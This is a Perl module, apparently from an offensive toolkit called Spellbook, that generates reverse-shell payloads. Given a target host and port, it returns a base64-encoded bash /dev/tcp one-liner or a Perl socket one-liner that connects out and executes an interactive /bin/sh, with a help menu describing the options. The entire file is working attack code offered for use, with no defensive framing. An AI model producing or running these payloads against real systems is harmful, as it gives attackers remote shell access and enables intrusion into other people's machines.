package Spellbook::Helper::Reverse_Shell {
    use strict;
    use warnings;
    use MIME::Base64;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target);

        my $port = 1337;
        my $lang = 'perl';

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'     => \$help,
            't|target=s' => \$target,
            'p|port=i'   => \$port,
            'l|lang=s'   => \$lang
        );

        if ($target) {
            my $payloads = {
                'bash' => "bash -i >& /dev/tcp/$target/$port 0>&1",
                'perl' => "perl -e 'use Socket;\$i=\"$target\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            };

            return encode_base64($payloads -> {$lang});
        }

        if ($help) {
            return "
                \rHelper::Reverse_Shell
                \r=====================
                \r-h, --help        See this menu
                \r-t, --target      Set your IP/Host to send the reverse shell
                \r-p, --port        Define a port to connect
                \r-l, --lang        Default is perl, types avaible: perl, bash\n\n";
        }

        return 0;
    }
}

1;